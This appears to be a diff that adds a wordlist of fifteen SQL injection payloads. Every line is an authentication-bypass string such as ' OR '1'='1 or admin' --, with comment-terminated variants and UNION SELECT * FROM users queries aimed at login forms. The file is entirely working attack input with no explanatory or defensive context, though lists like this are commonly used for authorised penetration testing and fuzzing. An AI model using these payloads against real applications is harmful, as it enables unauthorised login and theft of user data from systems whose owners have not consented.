@@ -1,0 +1,15 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+admin' --
+admin' #
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1' --
+admin' OR '1'='1' #
+admin' OR '1'='1'/*
+admin' OR '1'='1' AND 'a'='a
+admin' OR '1'='1' UNION SELECT * FROM users --
+admin' OR '1'='1' UNION SELECT * FROM users #
+admin' OR '1'='1' UNION SELECT * FROM users/*
